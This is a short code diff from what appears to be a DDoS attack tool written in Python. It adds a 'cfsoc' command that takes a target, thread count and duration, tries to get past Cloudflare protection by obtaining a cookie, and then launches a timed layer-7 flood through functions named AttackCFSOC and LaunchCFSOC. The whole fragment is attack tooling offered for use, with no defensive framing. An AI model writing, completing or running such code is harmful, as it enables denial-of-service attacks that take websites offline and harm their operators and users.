@@ -103,4 +103,13 @@ def AttackCFSOC(until_datetime, target, req):
         except:
             packet.close()
             pass
-
+        else:
+            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
+    elif command == "cfsoc" or command == "CFSOC":
+        target, thread, t = get_info_l7()
+        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
+        if get_cookie(target):
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            LaunchCFSOC(target, thread, t)
+            timer.join()
